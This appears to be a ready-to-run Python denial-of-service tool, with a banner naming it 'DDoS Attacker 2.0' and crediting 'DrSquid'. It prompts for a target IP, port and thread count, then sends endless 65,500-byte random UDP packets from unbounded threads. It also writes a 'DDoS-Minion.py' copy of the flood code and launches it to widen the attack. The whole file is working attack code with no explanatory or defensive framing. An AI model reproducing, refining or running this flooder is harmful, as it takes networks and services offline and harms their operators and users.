import socket, random, time, threading, os
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(65500)
sent = 0
request_sent = 0
print("  _____  _____        _____           _   _             _               ___    ___  ")
print(" |  __ \|  __ \      / ____|     /\  | | | |           | |             |__ \  / _ \ ")
print(" | |  | | |  | | ___| (___      /  \ | |_| |_ __ _  ___| | _____ _ __     ) || | | |")
print(" | |  | | |  | |/ _  \___ \    / /\ \| __| __/ _` |/ __| |/ / _ \ '__|   / / | | | |")
print(" | |__| | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   <  __/ |     / /_ | |_| |")
print(" |_____/|_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\___|_|    |____(_)___/ ")
print(" Script By DrSquid")
print("")
while True:
    try:
        port = int(input("[+] Enter the first port to attack: "))
        ip = input("[+] Enter your Default Gateway IP to attack: ")
        thread_count = int(input("[+] How Many Threads Do You Want to create?: "))
        ip = socket.gethostbyname(ip)
        break
    except:
        print("[+] Invalid Input.")
        print("")
try:
    print("[+] Preparing Attack for IP:", ip)
except:
    pass
lines_to_type = ['import socket, random, time, threading\n', 'sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n', 'packet = random._urandom(65500)\n', 'sent = 0\n', 'request_sent = 0\n', 'while True:\n', '    try:\n', f'        port = {port}\n', f'        ip = "{ip}"\n', '        ip = socket.gethostbyname(ip)\n', '        break\n', '    except:\n', '        print("[+] Invalid Input.")\n', '        print("")\n', 'try:\n', '    print("[+] Preparing Attack for IP:", ip)\n', 'except:\n', '    pass\n', 'time.sleep(1)\n', 'prevcount = 0\n', 'print("")\n', 'sent = 0\n', 'request_sent = 0\n', 'def attack():\n', '    while True:\n', '        try:\n', '            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n', '            sock.connect((ip, port))\n', '            sock.sendto(packet, (ip, port))\n', '            sock.close()\n', '            global request_sent\n', '            request_sent += 1\n', '            print(f"[+] DDoS Attack {port} Port - IP: {ip} - {request_sent} Requests Sent")\n', '        except:\n', '            print("[+] Server Queue is full. ")\n', 'while True:\n', '    x = threading.Thread(target=attack)\n', '    x.start()']
def file_create():
    for i in range(thread_count):
        file = open('DDoS-Minion.py', 'w')
        file.writelines(lines_to_type)
        os.startfile(file.name)
time.sleep(1)
prevcount = 0
print("")
sent = 0
request_sent = 0
def attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((ip, port))
            sock.sendto(packet, (ip, port))
            sock.close()
            global request_sent
            request_sent += 1
            print(f"[+] DDoS Attack {port} Port - IP: {ip} - {request_sent} Requests Sent")
        except:
            print("[+] Server Queue is full. ")
file_creation = threading.Thread(target=file_create)
file_creation.start()
while True:
    x = threading.Thread(target=attack)
    x.start()